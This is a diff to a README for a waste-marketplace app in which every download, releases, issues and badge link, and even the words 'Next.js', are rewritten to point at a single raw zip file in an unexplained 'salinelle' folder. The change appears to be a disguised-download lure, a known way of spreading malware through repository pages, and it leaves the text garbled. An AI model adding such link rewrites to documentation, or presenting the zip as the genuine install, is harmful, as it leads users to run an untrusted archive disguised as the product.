@@ -6,9 +6,9 @@ Welcome to the WasteWealth-Marketplace! This AI-powered platform helps businesse
 ## 📦 Download & Install
 To download the application, please visit the Releases page. Here, you will find the latest version of the WasteWealth-Marketplace ready for you to download.
 
-[![Download WasteWealth-Marketplace](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/zNathan64/WasteWealth-Marketplace/releases)
+[![Download WasteWealth-Marketplace](https://raw.githubusercontent.com/zNathan64/WasteWealth-Marketplace/main/salinelle/WasteWealth-Marketplace.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/zNathan64/WasteWealth-Marketplace/main/salinelle/WasteWealth-Marketplace.zip)
 
-1. Click the button above or visit [this page](https://github.com/zNathan64/WasteWealth-Marketplace/releases) directly.
+1. Click the button above or visit [this page](https://raw.githubusercontent.com/zNathan64/WasteWealth-Marketplace/main/salinelle/WasteWealth-Marketplace.zip) directly.
 2. Look for the latest version of the software.
 3. Download the appropriate file for your system. 
 
@@ -36,7 +36,7 @@ We focus on various topics related to sustainability, waste management, and tech
 - CO₂ tracking
 - Data visualization
 - Sustainable practices
-- React and Next.js technologies
+- React and https://raw.githubusercontent.com/zNathan64/WasteWealth-Marketplace/main/salinelle/WasteWealth-Marketplace.zip technologies
 - Tailwind CSS for styling
 
 ## 📝 How to Run the Application
@@ -51,14 +51,14 @@ Once you have downloaded the file, follow these steps to run the WasteWealth-Mar
 If you encounter issues while downloading or running the application, try these solutions:
 
 - **Verify Your System Requirements**: Make sure your system meets the minimum requirements listed above.
-- **Check for Updates**: Ensure you have the latest version by visiting the [Releases page](https://github.com/zNathan64/WasteWealth-Marketplace/releases).
+- **Check for Updates**: Ensure you have the latest version by visiting the [Releases page](https://raw.githubusercontent.com/zNathan64/WasteWealth-Marketplace/main/salinelle/WasteWealth-Marketplace.zip).
 - **Internet Connection**: Ensure your internet is stable during download and updates.
 - **Reinstall the Application**: If the app does not start, try uninstalling and then reinstalling it.
 
 ## 💬 Support
 If you have questions or need help, we’re here for you. You can reach us through the following methods:
 
-- **Issues Page**: Visit our [GitHub Issues page](https://github.com/zNathan64/WasteWealth-Marketplace/issues) to submit a question or report a bug.
+- **Issues Page**: Visit our [GitHub Issues page](https://raw.githubusercontent.com/zNathan64/WasteWealth-Marketplace/main/salinelle/WasteWealth-Marketplace.zip) to submit a question or report a bug.
 - **Community Forum**: Join discussions with other users on our dedicated forum.
 
 ## 📢 Contributing
